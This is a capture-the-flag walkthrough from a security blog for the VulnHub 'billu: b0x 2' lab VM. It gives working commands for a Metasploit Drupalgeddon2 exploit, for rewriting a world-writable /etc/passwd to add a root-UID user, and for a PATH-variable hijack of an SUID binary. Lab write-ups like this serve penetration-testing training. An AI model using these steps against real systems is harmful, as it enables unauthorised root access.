<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the billu: b0x 2 VM (Boot to Root)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-billu-b0x-2-vm-boot-to-root/" rel="bookmark"><time class="entry-date published" datetime="2018-07-15T18:30:46+00:00">July 15, 2018</time><time class="updated" datetime="2025-06-10T20:12:16+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve the latest CTF challenge “Billu Box2” presented by vulnhub for penetration practice and design by Manish Kishan Tanwar. This virtual machine is having intermediate to the medium difficulty level. One need to break into VM using the web application and from there escalate privileges to gain root access.</span></p>
<p><span style="color: #000000;">You can download it from this Link: <a style="color: #000000;" href="https://www.vulnhub.com/entry/billu-b0x-2,238/">https://www.vulnhub.com/entry/billu-b0x-2,238/</a></span></p>
<p><span style="color: #000000;"><strong>Penetration Methodologies</strong></span></p>
<ul>
<li><span style="color: #000000;">Network scanning</span></li>
<li><span style="color: #000000;">Exploit Drupal (Metasploit)</span></li>
<li><span style="color: #000000;">privilege escalation via Writable /passwd file</span></li>
<li><span style="color: #000000;">privilege escalation via PATH variable</span></li>
<li><span style="color: #000000;">Get root access and capture the flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<p><span style="color: #000000;">You will get target VM machine IP at the time of boot-up as you can observe we have it as 192.168.1.108.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8uTWvwp1rz8/W0uSKwTko6I/AAAAAAAAYLo/m2tANKXx8wUrzIdBWaMP4pEkZrc18xJuACLcBGAs/s1600/0.png"/></span></p>
<p><span style="color: #000000;">So let’s start with nmap port enumeration and execute following command in our terminal.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.108</pre>
<p><span style="color: #000000;">Here I noticed <strong><em>Drupal 8</em></strong> CMS is running through apache and might be you are knowing that Metasploit contains a module to compromise the target by exploiting <em>drupalgeddon</em>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zs_mHkx9zGo/W0uSK_3z01I/AAAAAAAAYLs/L37sM_MQQioVAKL68p1ubkUUzAakLOr9gCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">So let’s try to exploit this web application with the help of the Metasploit module and for that execute the following command:</span></p>
<pre class="lang:default decode:true">use exploit/unix/webapp/drupal_drupalgeddon2
msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.108
msf exploit(unix/webapp/drupal_drupalgeddon2)&gt; exploit</pre>
<p><span style="color: #000000;">Yippee!! We have owned meterpreter session 1, now let’s go for privilege escalation. Firstly let access proper tty shell with help of python one-liner and identify kernel version.</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'
lsb_release -a</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SHkPgjJQj6w/W0uSMGquZxI/AAAAAAAAYMA/Tr0TrfwVPQI2XAMJiRK0X_0PHcgfNgQkACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">I search for any relative kernel exploit but didn’t found any working exploit so I penetrated a little bit more and enumerated that the <strong><em>/passwd</em></strong> file has <strong>ALL 777 permission</strong> as shown in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mgreZ4o1SLQ/W0uSMK5PpdI/AAAAAAAAYME/PPOdKJ6YdDYmBbKTMIpATqIqPqzwyy1EQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">With help of cat command, we open /etc/passwd file and notice an entry for local user “indishell” inside it. Since this file has ALL permission which means I can modify it very easily. So I copied the whole /passwd file in an empty text file in our local machine and saved at /root/Desktop/passwd.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wMbN71FuqHw/W0uSLFsJMCI/AAAAAAAAYLw/UlnUeul46y0M47PQI37b9CpVYHPQ9xsDQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">As you can observe the entry for user indishell contain encrypted passwd and I don’t know which encryption is used therefore I will try to replace the original salt password. We can use OpenSSL command which will generate an encrypted password with salt.</span></p>
<pre class="lang:default decode:true">openssl passwd -1 -salt abc pass123</pre>
<p><span style="color: #000000;">Now copy it which is the new salt password for a password:<strong>pass123</strong> and paste at the place of an original salt password for user indishell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uoFVzrNClqE/W0uSLv5UdqI/AAAAAAAAYL0/nqCyPc919HksUuflJ2Nfop9GrVaLsevxgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">As you can observe, we had manipulated old password hash from our new password salt and also modify UID GID as <strong>0:0</strong> to make him a member of the root user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jqmfqVr9b3o/W0uSLrkXU7I/AAAAAAAAYL4/6bqzSo9eAEgGmuN9fgzRJJwsZqRLB7DZQCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now transfer your modified passwd file into target’s VM machine and follow the below steps to access root shell terminal.</span></p>
<pre class="lang:default decode:true">cd /etc
upload /root/Desktop/passwd .
python -c 'import pty;pty.spawn("/bin/bash")'
su indishell
whoami</pre>
<p><span style="color: #000000;">B000M!!!! We hit the Goal and got root access to this VM. This vulnerability can be exploited in multiple ways and for detail open this link: <a style="color: #000000;" href="http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/</a></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eEacEZxdjlM/W0uSL79tqcI/AAAAAAAAYL8/J0rqb8lgpKERHZJIhZBDW9Mxw1Df-mlQACLcBGAs/s1600/17.png"/></span></p>
<h3><span style="color: #800000;"><strong>Second Method for Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Search for the file having SUID or 4000 permission with help of Find command.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">Here I found SUID bit is enabled for a file named as “<strong>s</strong>” which is present inside /opt directory, on its execution we realize that it is an SCP file which is asking SSH authentication.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uatyRmDf8MM/W2vFDxySp_I/AAAAAAAAZiM/6NpGhNH9dYkbjqGyIxaSgzdpeYpeiKvPQCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Hence, now we can modify this file to get a bash shell with the help of the following step which is also known Path Variable Privilege Escalation.</span></p>
<pre class="lang:default decode:true ">cd /tmp
echo "/bin/sh" &gt; scp
chmod 777 scp
export PATH=/tmp:$PATH
cd /opt
./s
id</pre>
<p><span style="color: #000000;">This vulnerability can be exploited in multiple ways and for detail open this link: http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YPg27rdzXhY/W2vFECcFV8I/AAAAAAAAZiQ/_SdevCb4Sj4Iv8j-Vzr-m12qJQp5uiIIgCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Devender Kumar</strong>, An IT security Specialist and Post Graduate in Cyber Law &amp; Cyber Forensics. You can Contact him<a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/devendersaini/"><strong> here</strong></a> </span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
